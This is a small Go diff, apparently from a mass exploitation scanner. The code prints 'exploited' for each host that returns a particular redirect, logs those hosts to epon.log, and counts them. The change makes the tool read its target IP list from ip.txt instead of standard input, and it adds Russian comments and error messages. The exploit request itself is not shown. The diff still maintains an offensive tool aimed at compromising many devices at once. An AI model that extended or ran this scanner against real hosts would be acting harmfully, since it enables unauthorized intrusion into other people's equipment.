@@ -124,7 +124,7 @@ func process_host(host string) {
 
 	if strings.Contains(buf, "HTTP/1.0 302 Redirect") {
 		fmt.Printf("exploited %s (%s %s)\r\n", host, auth, bauth)
-		sendLog("epon.log", host + "\r\n")
+		sendLog("epon.log", host+"\r\n")
 		exploited++
 	}
 
@@ -144,7 +144,15 @@ func title_writer() {
 func main() {
 	go title_writer()
 
-	scan := bufio.NewScanner(os.Stdin)
+	// Открываем файл ip.txt
+	file, err := os.Open("ip.txt")
+	if err != nil {
+		fmt.Printf("Ошибка при открытии файла ip.txt: %v\n", err)
+		return
+	}
+	defer file.Close()
+
+	scan := bufio.NewScanner(file)
 
 	runtimeMax, _ := strconv.Atoi(os.Args[2])
 
